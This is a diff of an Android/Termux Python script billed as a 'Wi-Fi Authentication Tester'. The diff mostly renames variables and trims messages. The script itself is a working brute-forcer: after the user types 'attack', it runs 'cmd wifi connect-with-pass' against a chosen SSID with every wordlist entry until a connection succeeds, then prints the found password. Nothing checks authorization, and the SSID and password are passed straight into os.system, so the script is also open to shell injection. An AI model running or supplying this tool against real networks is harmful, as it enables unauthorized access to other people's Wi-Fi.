@@ -1,9 +1,8 @@
 import os
 import time
 import subprocess
-import json
 
-# ANSI Color Codes
+# Professional Terminal Colors
 RED = '\033[91m'
 GREEN = '\033[92m'
 RESET = '\033[0m'
@@ -15,70 +14,64 @@ def banner():
     print(f"{RED}{BOLD}" + "="*45)
     print("        WI-FI AUTHENTICATION TESTER")
     print("="*45 + f"{RESET}")
-    print(f"      {GREEN}Created By: Bayazid Habib{RESET}")
-    print(f"      {BLUE}Engine: Termux-API (Standalone){RESET}\n")
+    print(f"      {GREEN}Developed By: Bayazid Habib{RESET}")
+    print(f"      {BLUE}Engine: Termux-API Standalone{RESET}\n")
 
-def check_ssid_availability(target_ssid):
-    # Shizuku-র কোনো প্রয়োজন নেই, সরাসরি Termux-API ব্যবহার
-    print(f"[*] Scanning for SSID: {target_ssid}...")
+def check_target(ssid):
+    print(f"[*] Scanning for: {ssid}...")
     try:
-        scan_output = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
-        if target_ssid in scan_output:
-            print(f"{GREEN}[+] SSID '{target_ssid}' is in range.{RESET}")
+        scan = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
+        if ssid in scan:
+            print(f"{GREEN}[+] {ssid} is in range.{RESET}")
             return True
         else:
-            print(f"{RED}[!] Error: SSID '{target_ssid}' not found nearby!{RESET}")
+            print(f"{RED}[!] Error: {ssid} not found.{RESET}")
             return False
     except Exception:
-        # Shizuku সংক্রান্ত এরর মেসেজ পুরোপুরি রিমুভ করা হয়েছে
-        print(f"{RED}[-] Scan failed! Ensure Termux-API is installed and Location is ON.{RESET}")
+        print(f"{RED}[-] Scan failed! Ensure Termux-API and Location are ON.{RESET}")
         return False
 
-def attack():
+def start():
     banner()
     
     while True:
-        cmd_input = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
-        if cmd_input == "attack":
+        cmd = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
+        if cmd == "attack":
             break
 
-    ssid = input("[+] Target WiFi SSID: ")
-    if not check_ssid_availability(ssid):
+    target_ssid = input("[+] Target SSID: ")
+    if not check_target(target_ssid):
         return
 
-    wordlist_path = input("[+] Enter Wordlist Path: ")
-    if not os.path.exists(wordlist_path):
-        print(f"{RED}[-] Wordlist file not found!{RESET}")
+    wordlist = input("[+] Wordlist Path: ")
+    if not os.path.exists(wordlist):
+        print(f"{RED}[-] Wordlist not found!{RESET}")
         return
 
     try:
-        with open(wordlist_path, 'r') as f:
+        with open(wordlist, 'r') as f:
             lines = f.readlines()
-            print(f"\n{GREEN}[*] Process Started for SSID: {ssid}{RESET}")
+            print(f"\n{GREEN}[*] Testing connection for: {target_ssid}{RESET}")
             
-            for index, line in enumerate(lines, 1):
-                password = line.strip()
+            for i, pwd in enumerate(lines, 1):
+                password = pwd.strip()
                 if len(password) < 8: continue
                 
-                print(f"[*] Testing [{index}/{len(lines)}]: {password}", end='\r')
+                print(f"[*] Attempt [{i}/{len(lines)}]: {password}", end='\r')
                 
-                # সরাসরি Android CMD কমান্ড
-                command = f'cmd wifi connect-with-pass "{ssid}" "{password}"'
-                os.system(command)
-                
+                os.system(f'cmd wifi connect-with-pass "{target_ssid}" "{password}"')
                 time.sleep(3)
                 
                 try:
-                    # কানেকশন স্ট্যাটাস চেক
                     check = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
-                    if ssid in check and "ip_address" in check:
-                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password found: {password}{RESET}")
+                    if target_ssid in check and "ip_address" in check:
+                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password: {password}{RESET}")
                         return
                 except:
                     pass
                 
     except KeyboardInterrupt:
-        print(f"\n{RED}[!] Process stopped by user.{RESET}")
+        print(f"\n{RED}[!] Stopped by user.{RESET}")
 
 if __name__ == "__main__":
-    attack()
+    start()
